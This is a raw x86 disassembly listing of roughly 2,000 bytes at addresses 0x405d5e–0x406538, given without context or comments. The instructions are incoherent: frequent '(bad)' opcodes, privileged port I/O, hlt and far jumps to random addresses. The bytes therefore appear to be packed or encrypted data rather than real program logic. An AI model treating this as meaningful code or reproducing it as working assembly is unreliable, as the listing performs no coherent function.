  405d5e:	xlat   BYTE PTR ds:[ebx]
  405d5f:	xor    BYTE PTR [esi+0x11135d23],0xcd
  405d66:	push   ds
  405d67:	cld    
  405d68:	jge    0x405db1
  405d6a:	ret    0xc912
  405d6d:	xor    ah,BYTE PTR [eax+0x47]
  405d70:	out    0xb2,al
  405d72:	ss leave 
  405d74:	xor    BYTE PTR [ebx-0x7f],dh
  405d77:	cld    
  405d78:	mov    eax,0x2691020
  405d7d:	pop    eax
  405d7e:	std    
  405d7f:	pop    edx
  405d80:	call   0x85c06a67
  405d85:	or     BYTE PTR [edx],ch
  405d87:	mov    ah,0xd4
  405d89:	and    DWORD PTR [ebp-0x57ddb073],ebp
  405d8f:	rol    BYTE PTR [eax-0x12c19c53],0x2b
  405d96:	ret    
  405d97:	mov    esp,0x60870966
  405d9c:	outs   dx,DWORD PTR ds:[esi]
  405d9d:	fwait
  405d9e:	push   ebp
  405d9f:	add    BYTE PTR [eax+0x9ee473c],bh
  405da5:	cmp    DWORD PTR [esi-0x38ddf715],ebp
  405dab:	inc    ebx
  405dac:	(bad)  
  405dad:	mov    eax,edx
  405daf:	in     eax,dx
  405db0:	sub    ecx,DWORD PTR [esi+0x6f]
  405db3:	ret    
  405db4:	or     ebp,ecx
  405db6:	into   
  405db7:	clc    
  405db8:	lods   eax,DWORD PTR ds:[esi]
  405db9:	retf   
  405dba:	shr    BYTE PTR [edx],1
  405dbc:	lds    edi,FWORD PTR [eax-0x732128f8]
  405dc2:	and    ebx,ecx
  405dc4:	lock jns 0x405d5b
  405dc7:	jno    0x405dc2
  405dc9:	sbb    al,0x3b
  405dcb:	dec    ecx
  405dcc:	hlt    
  405dcd:	ins    DWORD PTR es:[edi],dx
  405dce:	ss ins BYTE PTR es:[edi],dx
  405dd0:	inc    ebx
  405dd1:	cmp    al,0x98
  405dd3:	dec    esp
  405dd4:	mov    esp,0x1523ba81
  405dd9:	arpl   WORD PTR [edx-0x484a49a5],sp
  405ddf:	daa    
  405de0:	sbb    al,dh
  405de2:	or     DWORD PTR [ebp+eiz*2-0x77f20d7c],ebx
  405de9:	scas   ax,WORD PTR es:[edi]
  405deb:	data16 mov dh,0xd9
  405dee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405def:	(bad)  
  405df0:	or     ebp,DWORD PTR [edi]
  405df2:	outs   dx,DWORD PTR ds:[esi]
  405df3:	ins    BYTE PTR es:[edi],dx
  405df4:	in     al,dx
  405df5:	shr    DWORD PTR [esp+eiz*4+0x6d],1
  405df9:	cld    
  405dfa:	mov    eax,ds:0xfec5cd59
  405dff:	(bad)  [edx+0x19e2ce7d]
  405e05:	sbb    edi,edi
  405e07:	lock and dh,al
  405e0a:	shr    DWORD PTR [edx],1
  405e0c:	jno    0x405e66
  405e0e:	pop    esp
  405e0f:	jmp    0x1902516c
  405e14:	(bad)  
  405e15:	cs mov ebx,0xc5b7ec20
  405e1b:	xchg   ecx,eax
  405e1c:	out    0xeb,eax
  405e1e:	arpl   dx,cx
  405e20:	(bad)  
  405e21:	loop   0x405dbe
  405e23:	int    0x56
  405e25:	jmp    FWORD PTR [eax]
  405e27:	push   cs
  405e28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e29:	aad    0x47
  405e2b:	jmp    0xb0379e0f
  405e30:	mov    ecx,0x955e58e3
  405e35:	mov    ecx,0x2a2d2b2a
  405e3a:	sub    dl,BYTE PTR [ebp+ebx*4+0x41]
  405e3e:	push   esp
  405e3f:	sub    al,0x2b
  405e41:	fsubr  QWORD PTR [ebx]
  405e43:	dec    esp
  405e44:	sub    dh,BYTE PTR [ebp+edi*1-0x752486f7]
  405e4b:	in     al,0x84
  405e4d:	outs   dx,BYTE PTR ds:[esi]
  405e4e:	inc    esi
  405e4f:	dec    esp
  405e51:	jns    0x405ecd
  405e53:	lea    edx,[edx+0x50]
  405e56:	ins    BYTE PTR es:[edi],dx
  405e57:	jne    0x405e7a
  405e59:	ret    
  405e5a:	retf   0x4d93
  405e5d:	push   ebx
  405e5e:	xor    DWORD PTR [edx+0x210ce859],ecx
  405e64:	dec    ebx
  405e65:	jle    0x405e28
  405e67:	fsubr  DWORD PTR [edx]
  405e69:	or     BYTE PTR [edx+0x7360ab7d],bl
  405e6f:	add    al,0xcc
  405e71:	js     0x405e0a
  405e73:	sbb    ecx,edx
  405e75:	mov    cl,0x48
  405e77:	sub    BYTE PTR [esi],dh
  405e79:	adc    ebx,DWORD PTR [edi-0x2c]
  405e7c:	and    bl,BYTE PTR [eax]
  405e7e:	imul   ecx,DWORD PTR [esi],0xfffffff1
  405e81:	test   BYTE PTR [eax],dh
  405e83:	inc    ecx
  405e84:	mov    ecx,DWORD PTR [ebx+edi*2]
  405e87:	stos   DWORD PTR es:[edi],eax
  405e88:	and    esp,edx
  405e8a:	cwde   
  405e8b:	pop    edx
  405e8c:	jmp    0x405e9e
  405e8e:	dec    ebx
  405e8f:	jmp    0xf03d:0x6db559b
  405e96:	cmp    BYTE PTR [edi-0x2c7b3a86],bl
  405e9c:	cmp    DWORD PTR [eax+eax*2],esp
  405e9f:	and    eax,0x9c157f06
  405ea4:	pop    edx
  405ea5:	dec    ecx
  405ea6:	test   BYTE PTR [esi+0x1fe2cf71],cl
  405eac:	hlt    
  405ead:	mov    al,0x9e
  405eaf:	mov    dl,BYTE PTR [edi]
  405eb1:	ficomp DWORD PTR [ebp+0x2c]
  405eb4:	imul   ebp,DWORD PTR [edx-0x1daa25f1],0x6
  405ebb:	and    DWORD PTR [ecx+0x79dd805],0x6eaa7461
  405ec5:	mov    dl,0xb6
  405ec7:	mov    ebp,DWORD PTR ds:0xdd9402ab
  405ecd:	loopne 0x405ecf
  405ecf:	inc    esp
  405ed0:	retf   0x161e
  405ed3:	(bad)  
  405ed4:	dec    ebx
  405ed5:	add    al,dl
  405ed7:	push   edx
  405ed8:	add    eax,0x45f980f1
  405edd:	add    DWORD PTR [eax+0x3dfb11cb],edx
  405ee3:	ds mov ecx,ebx
  405ee6:	fimul  DWORD PTR [edx-0xf]
  405ee9:	in     al,0x2d
  405eeb:	std    
  405eec:	mov    al,0x77
  405eee:	push   eax
  405eef:	nop
  405ef0:	aam    0x25
  405ef2:	xlat   BYTE PTR ds:[ebx]
  405ef3:	int    0x5e
  405ef5:	or     DWORD PTR [ecx+0x2a],ebx
  405ef8:	adc    DWORD PTR [edx-0x73],ebx
  405efb:	gs sti 
  405efd:	fdiv   st(6),st
  405eff:	pop    ss
  405f00:	lds    edx,FWORD PTR [esi+edx*2]
  405f03:	push   esp
  405f04:	repnz in eax,dx
  405f06:	fdivr  DWORD PTR [eax+0x4f]
  405f09:	sar    BYTE PTR [edi+ecx*8],1
  405f0c:	mul    DWORD PTR [ebx+0x661b27ad]
  405f12:	mov    esi,0x396d3fb3
  405f17:	(bad)
  405f1a:	out    dx,eax
  405f1b:	xchg   BYTE PTR [eax-0x69b2e09f],ah
  405f21:	hlt    
  405f22:	mov    cl,0x6c
  405f24:	and    eax,0xa3bf9d8
  405f29:	sub    al,0xf4
  405f2b:	push   esi
  405f2c:	je     0x405fa8
  405f2e:	popa   
  405f2f:	jp     0x405f56
  405f31:	push   es
  405f32:	in     eax,0x4d
  405f34:	fcom   DWORD PTR [ebx+eiz*1+0x955fa5d]
  405f3b:	(bad)  
  405f3c:	pop    esp
  405f3d:	push   eax
  405f3e:	lahf   
  405f3f:	dec    ebx
  405f40:	fistp  DWORD PTR [ebp+0x43bbe71e]
  405f46:	adc    eax,0x863ce4d6
  405f4b:	xchg   esp,eax
  405f4c:	sbb    edi,DWORD PTR [edi]
  405f4e:	shl    BYTE PTR [ebx],1
  405f50:	repz cmc 
  405f52:	gs sbb edi,esp
  405f55:	sti    
  405f56:	neg    BYTE PTR [ebp+0x31]
  405f59:	mov    ds:0x4fd5f485,eax
  405f5e:	pop    ebp
  405f5f:	mov    eax,ds:0xfe6cdd7a
  405f64:	push   0xffffff9a
  405f66:	ja     0x405f9a
  405f68:	adc    BYTE PTR [ecx-0x27],0x37
  405f6c:	xor    cl,al
  405f6e:	inc    edx
  405f6f:	retf   
  405f70:	inc    ebx
  405f71:	pop    esp
  405f72:	xchg   esi,eax
  405f73:	ror    BYTE PTR [eax-0x374f9689],1
  405f79:	pop    esi
  405f7a:	lods   al,BYTE PTR ds:[esi]
  405f7b:	lock pop edx
  405f7d:	call   0x7e99:0xffb42f7e
  405f84:	xchg   esi,eax
  405f85:	mov    gs,WORD PTR [ecx+ebp*4]
  405f88:	icebp  
  405f89:	mov    bl,0x6
  405f8b:	call   0x56780af4
  405f90:	adc    al,0xb4
  405f92:	xchg   edx,eax
  405f93:	pop    ds
  405f94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f95:	push   es
  405f96:	sub    edi,eax
  405f98:	add    al,0xf5
  405f9a:	jge    0x405fdf
  405f9c:	cs cs lahf 
  405f9f:	aas    
  405fa0:	dec    esi
  405fa1:	jne    0x405ff4
  405fa3:	xor    eax,0x867d036f
  405fa8:	rcl    BYTE PTR [esi-0x2a0447eb],1
  405fae:	jl     0x405f8b
  405fb0:	rol    DWORD PTR [edi+edi*4+0x331cdae6],1
  405fb7:	shr    BYTE PTR ds:0xa9126ea6,1
  405fbd:	enter  0x8081,0x4c
  405fc1:	fwait
  405fc2:	(bad)  
  405fc3:	inc    edx
  405fc4:	mov    ah,0x69
  405fc6:	push   0x0
  405fc8:	ins    BYTE PTR es:[edi],dx
  405fc9:	xor    eax,0xfcb90004
  405fce:	imul   edx,DWORD PTR [eax+0x11],0xd76301db
  405fd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fd6:	jns    0x406044
  405fd8:	mov    al,0xd1
  405fda:	cdq    
  405fdb:	pop    eax
  405fdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fdd:	mov    al,ds:0xfd9bfd2f
  405fe2:	pushf  
  405fe3:	sub    al,0x28
  405fe5:	mov    ch,0xe3
  405fe7:	(bad)  
  405fe8:	test   al,0x8f
  405fea:	aad    0xee
  405fec:	inc    ebx
  405fed:	mov    WORD PTR [edx],gs
  405fef:	out    dx,eax
  405ff0:	cwde   
  405ff1:	out    0x99,al
  405ff3:	bound  ebx,QWORD PTR [ebx+0x76]
  405ff6:	popf   
  405ff7:	(bad)  
  405ff8:	mov    ah,BYTE PTR [ecx+0x40]
  405ffb:	dec    ebp
  405ffc:	inc    ebp
  405ffe:	std    
  405fff:	scas   eax,DWORD PTR es:[edi]
  406000:	enter  0xc104,0xb0
  406004:	gs cmp eax,0x2c17c982
  40600a:	xor    eax,0xa1f0228b
  40600f:	lods   eax,DWORD PTR ds:[esi]
  406010:	or     dh,al
  406012:	in     eax,dx
  406013:	dec    ebp
  406014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406015:	pop    eax
  406016:	pop    ebp
  406017:	pop    eax
  406018:	test   al,0x66
  40601a:	push   edx
  40601b:	jmp    0xbda0:0xb2301477
  406022:	add    ebp,DWORD PTR [eax-0x40]
  406025:	adc    ebx,DWORD PTR [edx+0x54]
  406028:	xchg   esp,eax
  406029:	inc    edi
  40602a:	pop    ebx
  40602b:	(bad)  
  40602d:	loope  0x4060a6
  40602f:	pop    edx
  406030:	mov    ah,0x8b
  406032:	push   cs
  406033:	xor    edx,DWORD PTR [edx-0x30ff441f]
  406039:	and    eax,0xf5f5cb4e
  40603e:	(bad)  
  40603f:	mov    edi,0x626b7803
  406044:	scas   al,BYTE PTR es:[edi]
  406045:	jp     0x4060aa
  406047:	mov    ah,0xb6
  406049:	mov    al,0xc6
  40604b:	xchg   ecx,eax
  40604c:	in     al,dx
  40604d:	sti    
  40604e:	mov    bh,0x83
  406050:	sbb    DWORD PTR [esi+0x18],eax
  406053:	cmp    DWORD PTR ds:0xc1e3c60b,edi
  406059:	stos   BYTE PTR es:[edi],al
  40605a:	xor    ecx,DWORD PTR [esp+ecx*2-0x309d11f9]
  406061:	loope  0x405fed
  406063:	xchg   DWORD PTR [ebp+ecx*4-0x40],ebp
  406067:	push   cs
  406068:	push   ecx
  406069:	js     0x406032
  40606b:	fwait
  40606c:	cmp    eax,0x96920d02
  406071:	mov    ds:0x2c53eb85,eax
  406076:	aaa    
  406077:	test   DWORD PTR [edi],ebx
  406079:	outs   dx,BYTE PTR ds:[esi]
  40607a:	add    BYTE PTR [esi-0x2cebe254],dl
  406080:	std    
  406081:	jbe    0x406075
  406083:	lods   al,BYTE PTR ds:[esi]
  406084:	jmpw   0x7c2
  406088:	into   
  406089:	je     0x406045
  40608b:	inc    ecx
  40608c:	rcr    DWORD PTR [ebx-0x386b4979],1
  406092:	aad    0x8c
  406094:	loopne 0x406115
  406096:	ja     0x406097
  406098:	push   ebp
  406099:	mov    eax,0x2cce0ab6
  40609e:	and    eax,ebx
  4060a0:	sub    eax,0x61caf6fb
  4060a5:	xor    ch,BYTE PTR [esi-0x7f302e8e]
  4060ab:	aad    0x9a
  4060ad:	or     ebp,edi
  4060af:	ja     0x406114
  4060b1:	push   es
  4060b2:	(bad)  
  4060b3:	mov    bh,0x1e
  4060b5:	aas    
  4060b6:	clc    
  4060b7:	xor    al,0x47
  4060b9:	xchg   esi,eax
  4060ba:	add    edx,ecx
  4060bc:	xor    bh,ah
  4060be:	pop    ebp
  4060bf:	sti    
  4060c0:	test   al,0xe3
  4060c2:	stc    
  4060c3:	sbb    eax,0x7e6149d8
  4060c8:	scas   eax,DWORD PTR es:[edi]
  4060c9:	dec    eax
  4060ca:	push   ss
  4060cb:	scas   eax,DWORD PTR es:[edi]
  4060cc:	mov    al,0x99
  4060ce:	bnd jl 0x406079
  4060d1:	or     BYTE PTR [ebp+0x35c16473],dl
  4060d7:	dec    ecx
  4060d8:	loope  0x4060d6
  4060da:	xlat   BYTE PTR ds:[ebx]
  4060db:	cmp    DWORD PTR [edi],ebx
  4060dd:	inc    esi
  4060de:	fbld   TBYTE PTR [esi-0x6a]
  4060e1:	push   ebp
  4060e2:	or     al,0xa0
  4060e4:	aad    0xdb
  4060e6:	dec    eax
  4060e7:	or     al,0xe6
  4060e9:	and    edi,DWORD PTR [ecx-0x67865d11]
  4060ef:	adc    DWORD PTR [edi-0x58],eax
  4060f2:	cmp    eax,0x588aed90
  4060f7:	sub    DWORD PTR ds:0x7441072a,ebx
  4060fd:	mov    eax,0xaee31ce6
  406102:	adc    DWORD PTR [esp+esi*4],eax
  406105:	add    BYTE PTR [edx-0x4],0xce
  406109:	add    ebp,DWORD PTR [edi-0x6f]
  40610c:	mov    ecx,0xe4940905
  406111:	mov    al,0xfa
  406113:	loope  0x40610c
  406115:	sub    eax,0xa9d7fb6b
  40611a:	cmp    al,0xf
  40611c:	aas    
  40611d:	pop    ebp
  40611e:	xor    edi,DWORD PTR [ecx+0x25]
  406121:	pop    edx
  406122:	mov    esp,0x486f902c
  406127:	daa    
  406128:	mov    fs,edi
  40612a:	pop    esi
  40612b:	lods   eax,DWORD PTR ds:[esi]
  40612c:	add    bh,bh
  40612e:	rcl    BYTE PTR ds:0x6190c99a,1
  406134:	mov    esi,0x11736d76
  406139:	adc    al,0x82
  40613b:	ins    BYTE PTR es:[edi],dx
  40613c:	push   0x2734742c
  406141:	stos   DWORD PTR es:[edi],eax
  406142:	mov    bh,0xd2
  406144:	jmp    0x5db8b549
  406149:	xchg   edx,eax
  40614a:	pcmpgtb mm6,mm7
  40614d:	sbb    eax,0xefeb6ca2
  406152:	sub    al,ch
  406154:	inc    esp
  406155:	and    al,0x27
  406157:	mov    cl,bh
  406159:	mov    bh,0x7c
  40615b:	xchg   edi,eax
  40615c:	sbb    ch,BYTE PTR [edi+edi*4+0x78]
  406160:	mov    edx,0xf2176cf0
  406165:	mov    al,0xca
  406167:	outs   dx,DWORD PTR ds:[esi]
  406168:	dec    esi
  406169:	add    al,0x51
  40616b:	and    edx,DWORD PTR [ebp+0x238b8bd9]
  406171:	pop    ecx
  406172:	mov    dl,0x89
  406174:	call   0xc80d:0xd050b64e
  40617b:	jbe    0x40616f
  40617d:	(bad)  
  40617e:	jge    0x40614d
  406180:	mov    edx,0x63fc6fd1
  406185:	retf   
  406186:	jns    0x4061f1
  406188:	pushf  
  406189:	pushf  
  40618a:	sbb    cl,bl
  40618c:	jns    0x4061bd
  40618e:	gs cdq 
  406190:	test   esp,eax
  406192:	das    
  406193:	add    eax,edx
  406195:	sbb    esi,DWORD PTR [eax+0x71]
  406198:	shl    DWORD PTR [ebx],0xe0
  40619b:	sub    bh,BYTE PTR [ebx]
  40619d:	push   0x62d96175
  4061a2:	pop    esp
  4061a3:	ds add al,0xe8
  4061a6:	cmc    
  4061a7:	inc    esp
  4061a8:	icebp  
  4061a9:	pop    esi
  4061aa:	call   0x12b3d86d
  4061af:	mov    ah,BYTE PTR [ebx]
  4061b1:	adc    al,0x91
  4061b3:	into   
  4061b4:	js     0x4061bb
  4061b6:	daa    
  4061b7:	in     al,0xcb
  4061b9:	jle    0x4061eb
  4061bb:	cmp    BYTE PTR [esi+0x272a9e23],al
  4061c1:	fwait
  4061c2:	mov    bl,BYTE PTR es:[edx]
  4061c5:	mov    edx,0x87d3de03
  4061ca:	sbb    ah,BYTE PTR [eax]
  4061cc:	or     DWORD PTR [edi],0x58
  4061cf:	enter  0x58c4,0x63
  4061d3:	push   esi
  4061d4:	js     0x40619e
  4061d6:	dec    esp
  4061d7:	cwde   
  4061d8:	mov    fs,WORD PTR [esi-0x18]
  4061db:	xchg   esp,eax
  4061dc:	sbb    ecx,DWORD PTR [edx+0x23]
  4061df:	or     eax,0xfc91e8cc
  4061e4:	mov    DWORD PTR [ebp+0x7e],esp
  4061e7:	pop    ecx
  4061e8:	addr16 dec ebp
  4061ea:	call   FWORD PTR ds:0x9399f91c
  4061f0:	int3   
  4061f1:	fbstp  TBYTE PTR [edx+0x20822ffa]
  4061f7:	mov    esi,0x3f6aebb2
  4061fc:	and    DWORD PTR [esi],0xe48abde6
  406202:	int3   
  406203:	test   eax,0x669aebff
  406208:	test   al,0xb5
  40620a:	lock jmp 0x1a681d8b
  406210:	out    0xd,eax
  406212:	jp     0x406269
  406214:	push   esi
  406215:	(bad)  
  406216:	ret    
  406217:	nop
  406218:	and    BYTE PTR [ecx-0x30],0xb0
  40621c:	daa    
  40621d:	fdiv   QWORD PTR [edx-0x46]
  406220:	jg     0x4061bf
  406222:	scas   al,BYTE PTR es:[edi]
  406223:	mov    edx,0xf9f66d08
  406228:	int    0xb0
  40622a:	mov    ds:0x9b050cbc,al
  40622f:	ror    BYTE PTR [esi-0x4b731b8d],1
  406235:	jns    0x4061ee
  406237:	jbe    0x4061f9
  406239:	mov    edx,0x8937be7a
  40623e:	and    esp,DWORD PTR ds:[edx+0x6b]
  406242:	add    ah,BYTE PTR [ebx-0x46e84f5c]
  406248:	xchg   edx,eax
  406249:	push   ds
  40624a:	std    
  40624b:	(bad)  
  40624c:	adc    ch,BYTE PTR [edx]
  40624e:	sub    cl,ah
  406250:	sub    esp,DWORD PTR [edx+ecx*1+0x42]
  406254:	loop   0x406290
  406256:	pop    esi
  406257:	or     DWORD PTR [edx+0x6245984f],0xffffffe9
  40625e:	jns    0x40626c
  406260:	ret    0xfe52
  406263:	ret    0x362b
  406266:	or     eax,0x7166e45c
  40626b:	addr16 sbb eax,0x3863476
  406271:	jo     0x40622b
  406273:	aas    
  406274:	inc    edx
  406275:	mov    ah,dh
  406277:	xchg   ebp,eax
  406278:	push   eax
  406279:	xor    eax,0xf3ebd3c0
  40627e:	test   al,0x1b
  406280:	jb     0x4062fe
  406282:	pop    edi
  406283:	ja     0x406230
  406285:	xor    eax,0xec5b5c14
  40628a:	ins    DWORD PTR es:[edi],dx
  40628b:	or     eax,0xb4ba0164
  406290:	adc    esi,DWORD PTR [ebp-0x73]
  406293:	fild   WORD PTR [esi]
  406295:	and    cl,al
  406297:	jbe    0x4062ac
  406299:	cwde   
  40629a:	jle    0x406229
  40629c:	jns    0x406265
  40629e:	sub    eax,0xb628d407
  4062a3:	xchg   ebp,eax
  4062a4:	inc    esi
  4062a5:	ficomp DWORD PTR [esi]
  4062a7:	add    BYTE PTR [ecx],ch
  4062a9:	out    0x34,eax
  4062ab:	pusha  
  4062ac:	push   edi
  4062ad:	sbb    eax,0xe015ad98
  4062b2:	es mov bl,0x40
  4062b5:	js     0x406270
  4062b7:	pusha  
  4062b8:	xor    DWORD PTR [ebx],esp
  4062ba:	sbb    esp,DWORD PTR [ecx]
  4062bc:	cmp    ebx,DWORD PTR [ecx]
  4062be:	aad    0x1e
  4062c0:	sub    esi,DWORD PTR [ebx]
  4062c2:	fwait
  4062c3:	jae    0x4062e3
  4062c5:	loope  0x40629d
  4062c7:	call   0xe603:0x7e52e2ef
  4062ce:	dec    ecx
  4062cf:	or     eax,0xf890629b
  4062d4:	lea    ecx,[esi+edi*8+0x48db8c9f]
  4062db:	hlt    
  4062dc:	cld    
  4062dd:	nop
  4062de:	jp     0x4062b9
  4062e0:	aad    0x63
  4062e2:	jmp    0x7214889d
  4062e7:	xchg   esp,eax
  4062e8:	jge    0x4062b5
  4062ea:	les    ecx,FWORD PTR [ebx+edi*4+0x7e]
  4062ee:	dec    esp
  4062ef:	jmp    0x40634e
  4062f1:	pop    edi
  4062f2:	or     cl,cl
  4062f4:	push   ss
  4062f5:	jg     0x4062d0
  4062f7:	and    BYTE PTR [esi],dl
  4062f9:	rcl    BYTE PTR [esi+0x65228b95],0x92
  406300:	lahf   
  406301:	or     bh,cl
  406303:	jl     0x406382
  406305:	fiadd  WORD PTR [edi-0x4f]
  406308:	bound  esi,QWORD PTR [ebx-0x18603be]
  40630e:	fdivrp st(4),st
  406310:	sti    
  406311:	inc    eax
  406312:	or     BYTE PTR [edx],0x76
  406315:	mov    al,0xc2
  406317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406318:	jecxz  0x4062c8
  40631a:	(bad)  [ebx+0x51]
  40631d:	dec    ebp
  40631e:	jno    0x4062e4
  406320:	inc    edi
  406321:	dec    ebp
  406322:	xchg   ecx,eax
  406323:	loope  0x4062b2
  406325:	je     0x406354
  406327:	hlt    
  406328:	pop    ds
  406329:	or     al,0x96
  40632b:	out    dx,al
  40632c:	aam    0x71
  40632e:	mov    esp,DWORD PTR [esi+0x6e28264e]
  406334:	xchg   ebx,eax
  406335:	mov    ch,0x0
  406337:	push   0x7e
  406339:	adc    DWORD PTR [esi+0x1d6111c9],edx
  40633f:	into   
  406340:	mov    bh,0xb0
  406342:	leave  
  406343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406344:	push   0x1f7b528d
  406349:	(bad)  
  40634a:	adc    bh,cl
  40634c:	lea    esi,ss:[edx+eiz*1-0x4a]
  406351:	cdq    
  406352:	into   
  406353:	mov    ebx,0x15745d58
  406358:	fld    DWORD PTR [edx]
  40635a:	pop    ds
  40635b:	mov    bl,0x7f
  40635d:	cmp    BYTE PTR [edi+0x70e05be5],bh
  406363:	sub    al,BYTE PTR [ecx-0x42dff1d9]
  406369:	jo     0x406352
  40636b:	test   al,0xf6
  40636d:	ret    
  40636e:	out    dx,al
  40636f:	int3   
  406370:	push   edx
  406371:	mov    ds:0xcd69cd4c,eax
  406376:	aas    
  406377:	loop   0x406320
  406379:	stc    
  40637a:	jb     0x406302
  40637c:	and    cl,BYTE PTR [eax]
  40637e:	retf   
  40637f:	call   0xaa6b:0x2d707dac
  406386:	pop    ss
  406387:	xor    eax,0x535eec1a
  40638c:	addr16 pop ss
  40638e:	xlat   BYTE PTR ds:[ebx]
  40638f:	loop   0x406352
  406391:	ret    
  406392:	cld    
  406393:	mov    ah,0x9c
  406395:	cdq    
  406396:	jbe    0x406393
  406398:	int    0x4f
  40639a:	test   al,0x54
  40639c:	sub    ch,BYTE PTR [ebp+0x35]
  40639f:	xor    ch,BYTE PTR [ebx]
  4063a1:	pop    esp
  4063a2:	mov    bh,dl
  4063a4:	sbb    al,0xe9
  4063a6:	das    
  4063a7:	push   edi
  4063a8:	mov    ebp,ds
  4063aa:	sub    ch,dh
  4063ac:	dec    esi
  4063ad:	or     bh,dl
  4063af:	adc    ah,dh
  4063b1:	je     0x406376
  4063b3:	fld    QWORD PTR [ecx-0x6cdb4874]
  4063b9:	arpl   bx,di
  4063bb:	shl    BYTE PTR [ecx+edx*4+0x4d],0xf5
  4063c0:	push   edx
  4063c1:	pop    esp
  4063c2:	xchg   ecx,eax
  4063c3:	outs   dx,BYTE PTR ds:[esi]
  4063c4:	inc    esp
  4063c5:	add    BYTE PTR [eax-0x2cbf224c],0x51
  4063cc:	mov    eax,ds:0x9e19cde5
  4063d1:	mov    DWORD PTR [ebx-0x8],esp
  4063d4:	es jecxz 0x4063a3
  4063d7:	push   es
  4063d8:	arpl   WORD PTR [eiz*4+0x7072e1e2],ax
  4063df:	mov    bh,0x9c
  4063e1:	jmp    0x25677760
  4063e6:	test   DWORD PTR [edi+0x6a201d8f],esi
  4063ec:	mov    ss,edx
  4063ee:	in     eax,0x3
  4063f0:	aam    0xc3
  4063f2:	retf   
  4063f3:	ss call 0xf243:0x7866eac0
  4063fb:	shr    DWORD PTR [ecx+ebp*8+0x6168f407],1
  406402:	add    DWORD PTR [ebx+eiz*1-0x61],eax
  406406:	(bad)  
  406407:	push   ss
  406408:	ss inc eax
  40640a:	add    eax,0x61bc49cc
  40640f:	ins    DWORD PTR es:[edi],dx
  406410:	leave  
  406411:	mov    bl,0x5f
  406413:	(bad)  
  406414:	sti    
  406415:	mov    dh,0x6a
  406417:	push   cs
  406418:	pop    ebp
  406419:	and    BYTE PTR [edi+ebx*2+0x2303080a],ah
  406420:	retf   0x2ab
  406423:	pushf  
  406424:	(bad)
  406428:	in     eax,0xe5
  40642a:	(bad)  
  40642b:	jae    0x4063cc
  40642d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40642e:	sbb    BYTE PTR ds:0xc380e7a,bl
  406434:	sub    eax,0x1e5bc7ea
  406439:	mov    dl,BYTE PTR [ebp-0x61]
  40643c:	mov    esi,0x7de9d74e
  406441:	mov    cl,0xeb
  406443:	call   0x97da14df
  406448:	mov    eax,0xc1618a55
  40644d:	popa   
  40644e:	jns    0x40649f
  406450:	push   esp
  406451:	xchg   ecx,eax
  406452:	mov    dl,0xb9
  406454:	adc    bl,BYTE PTR [edi-0x3f]
  406457:	xor    DWORD PTR [edx],esp
  406459:	out    0xcd,al
  40645b:	push   esi
  40645c:	popf   
  40645d:	push   ebp
  40645e:	pop    ss
  40645f:	scas   eax,DWORD PTR es:[edi]
  406460:	sub    ecx,DWORD PTR [edx+0x34]
  406463:	pusha  
  406464:	aas    
  406465:	out    0x42,al
  406467:	cmp    ebx,esi
  406469:	pop    ebx
  40646a:	cwde   
  40646b:	mov    ebp,DWORD PTR ds:0x84cefc40
  406471:	(bad)  
  406472:	into   
  406473:	popa   
  406474:	test   al,0x6d
  406476:	add    eax,0xce354e9a
  40647b:	xor    eax,0xc05c4250
  406480:	adc    eax,DWORD PTR [edx+ebp*8]
  406483:	add    BYTE PTR [esi+0x1e4b8171],ah
  406489:	lods   al,BYTE PTR ds:[esi]
  40648a:	in     eax,0x8c
  40648c:	sub    dl,BYTE PTR [ebp+0x67]
  40648f:	push   0xdb9cc123
  406494:	lahf   
  406495:	add    al,0xf4
  406497:	jne    0x4064f3
  406499:	adc    DWORD PTR ds:[edx],edx
  40649c:	mov    bh,0x1d
  40649e:	mov    eax,0x38e04395
  4064a3:	and    esi,ecx
  4064a5:	push   ebp
  4064a6:	ret    
  4064a7:	mov    cl,0x48
  4064a9:	xor    BYTE PTR [edx+0x11706823],ah
  4064af:	push   ds
  4064b0:	mov    al,ds:0x62a6d425
  4064b5:	sbb    dh,BYTE PTR [eax]
  4064b7:	sub    eax,0x1bdac14f
  4064bc:	mov    ecx,0x11fd804b
  4064c1:	inc    esp
  4064c2:	xchg   BYTE PTR [ecx-0x42b4bfbe],bl
  4064c8:	push   esp
  4064c9:	fsub   DWORD PTR [ebp+ebp*2+0x7635380b]
  4064d0:	sub    al,0x5a
  4064d2:	imul   ecx,ebx,0x48
  4064d5:	dec    ebp
  4064d6:	mov    dh,0xcd
  4064d8:	pop    ebx
  4064d9:	mov    ds:0xe5c332e,eax
  4064de:	das    
  4064df:	ret    
  4064e0:	jns    0x40655c
  4064e2:	sub    dh,BYTE PTR [ebp+0x66]
  4064e5:	add    ch,al
  4064e7:	in     al,dx
  4064e8:	jg     0x4064f7
  4064ea:	xor    al,0x9f
  4064ec:	sub    DWORD PTR [ebp-0x39ee2801],eax
  4064f2:	jge    0x4064d4
  4064f4:	call   0x46356b77
  4064f9:	aaa    
  4064fa:	mov    ebx,DWORD PTR [ecx]
  4064fc:	pop    ebp
  4064fd:	and    cl,bl
  4064ff:	jl     0x406520
  406501:	cmp    BYTE PTR [esi],dl
  406503:	ins    DWORD PTR es:[edi],dx
  406504:	dec    edi
  406505:	int    0xf2
  406507:	stos   DWORD PTR es:[edi],eax
  406508:	(bad)  
  406509:	pop    edi
  40650a:	and    edi,DWORD PTR [esi-0xad186d]
  406510:	mov    edi,0xffb80b80
  406515:	mov    edi,0x540cbfc3
  40651a:	pop    ds
  40651b:	add    DWORD PTR [edx+0x60],eax
  40651e:	cmp    DWORD PTR [eax-0x5d9625a3],edx
  406524:	inc    edi
  406525:	test   DWORD PTR [eax+0x7f],eax
  406528:	add    dl,BYTE PTR [edi-0x8f8e911]
  40652e:	out    dx,eax
  40652f:	or     eax,0x98b4a871
  406534:	outs   dx,DWORD PTR gs:[esi]
  406536:	popf   
  406537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406538:	mov    esi,0xae5717ad
